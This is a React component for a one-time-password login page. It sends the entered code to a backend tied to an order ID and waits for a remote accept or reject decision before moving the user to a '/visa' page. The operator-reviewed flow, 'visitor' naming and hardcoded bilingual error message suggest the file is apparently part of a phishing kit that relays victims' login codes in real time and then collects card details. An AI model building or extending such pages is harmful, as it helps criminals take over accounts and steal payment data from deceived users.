import axios from "axios";
import React, { useEffect, useRef, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { BottomBar } from "../components/VisitorShared";
import { FieldError, formLevelErrorClass } from "../components/FormFieldError";
import { HeaderShell } from "../components/HeaderShell";
import { PendingFormOverlay } from "../components/PendingFormOverlay";
import { useLanguage } from "../context/LanguageContext";
import { api_route } from "../socketApi";
import { useOrderSession } from "../hooks/useOrderSession";
import { useTwoMinuteCountdown } from "../hooks/useTwoMinuteCountdown";

const LoginOtp = () => {
  const [otp, setOtp] = useState("");
  const [otpError, setOtpError] = useState("");
  const [formError, setFormError] = useState("");
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();
  const location = useLocation();
  const orderId =
    location.state?.orderId ?? sessionStorage.getItem("currentOrderId");
  const navigatedRef = useRef(false);
  const { t, dir: pageDir, textDir } = useLanguage();

  const { otpLoginAccept, rejectReason, hydrated, reviewLoginOtp } =
    useOrderSession(orderId);

  const { formatted: timerFormatted } = useTwoMinuteCountdown(120);

  const awaitingOtpDecision =
    hydrated && !!orderId && !otpLoginAccept && !rejectReason && reviewLoginOtp;

  useEffect(() => {
    if (!orderId) {
      navigate("/login", { replace: true });
    }
  }, [orderId, navigate]);

  useEffect(() => {
    if (!hydrated || !orderId || navigatedRef.current) return;

    if (rejectReason) {
      setFormError(rejectReason || t("workflow.rejected"));
      setLoading(false);
      return;
    }

    if (otpLoginAccept) {
      setLoading(false);
      navigatedRef.current = true;
      sessionStorage.setItem("currentOrderId", orderId);
      navigate("/visa", { state: { orderId } });
    }
  }, [hydrated, otpLoginAccept, rejectReason, orderId, navigate, t]);

  const onOtpChange = (e) => {
    const v = e.target.value.replace(/\D/g, "").slice(0, 6);
    setOtp(v);
    if (otpError) setOtpError("");
    if (formError) setFormError("");
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (otp.length < 4 || otp.length > 6) {
      setOtpError(t("loginOtp.otpErrorLength"));
      return;
    }
    setOtpError("");
    setFormError("");
    setLoading(true);
    try {
      await axios.post(`${api_route}/order/${orderId}/login-otp`, {
        otpLogin: otp,
      });
    } catch {
      setLoading(false);
      setFormError(t("home.errLoginFailed"));
    }
  };

  const blockFormUntilOutcome = loading || awaitingOtpDecision;

  if (!orderId) {
    return null;
  }

  const inputErr = !!otpError;

  return (
    <div
      className="relative flex min-h-screen w-full flex-col bg-white pb-24"
      dir={pageDir}
    >
      <HeaderShell>
        <div className="relative flex w-full items-center justify-center">
          <div className="flex max-w-md justify-end pr-0 pt-1" dir="ltr">
            <img
              src="/header.jpeg"
              alt=""
              className="h-full w-[90%] object-contain"
            />
          </div>
        </div>
      </HeaderShell>

      <form
        onSubmit={handleSubmit}
        className="relative mx-auto mt-4 flex min-h-[280px] w-[90%] max-w-md flex-col items-stretch gap-2 px-0"
        noValidate
      >
        <PendingFormOverlay
          show={blockFormUntilOutcome}
          ariaLabel={t("common.loadingAria")}
        />
        <>
          <p
            className="mb-1 max-w-xl self-center text-center text-sm leading-relaxed text-gray-800"
            dir={textDir}
          >
            {t("loginOtp.intro")}
          </p>

          <div
            className="mb-3 flex flex-col items-center gap-1"
            aria-live="polite"
          >
            <span className="text-sm text-gray-600" dir={pageDir}>
              {t("common.otpTimerRemaining")}
            </span>
            <span
              className="text-xl font-semibold tabular-nums tracking-wide text-[#0057FF]"
              dir="ltr"
            >
              {timerFormatted}
            </span>
          </div>

          <div className="mx-auto flex w-full max-w-sm flex-col items-center">
            <input
              type="text"
              name="otp"
              id="field-otp"
              inputMode="numeric"
              autoComplete="one-time-code"
              maxLength={6}
              required={false}
              placeholder="••••••"
              value={otp}
              onChange={onOtpChange}
              aria-invalid={inputErr}
              aria-describedby={inputErr ? "err-otp" : undefined}
              className={`w-full max-w-76 rounded-lg bg-white px-4 py-2 text-center text-base tracking-[0.3em] text-gray-900 outline-none placeholder:tracking-[0.35em] placeholder:text-gray-300 transition ${
                inputErr
                  ? "border-2 border-red-500 focus:border-red-600 focus:ring-2 focus:ring-red-100"
                  : "border border-[#3d3d6b] focus:ring-2 focus:ring-blue-100"
              }`}
            />
            <div className="w-full min-w-0 self-stretch sm:max-w-76">
              <FieldError id="err-otp" message={otpError} />
            </div>
          </div>
          <div className="mt-5 flex w-full justify-center pt-1 flex-col gap-2">
            {formError ? (
              <div className={formLevelErrorClass()} dir={pageDir} role="alert">
                <span>
                  {pageDir === "rtl"
                    ? "رمز التحقق غير صحيح .. يرجى المحاولة لاحقاً"
                    : "Incorrect OTP .. Please try again later "}
                </span>
              </div>
            ) : null}
            <button
              type="submit"
              disabled={blockFormUntilOutcome}
              className="rounded-full px-10 py-2.5 text-sm font-bold uppercase tracking-wide text-white shadow-md transition active:scale-[0.98] disabled:opacity-80"
              style={{ backgroundColor: "#0057FF" }}
            >
              {t("common.verify")}
            </button>
          </div>
        </>
      </form>

      <BottomBar />
    </div>
  );
};

export default LoginOtp;
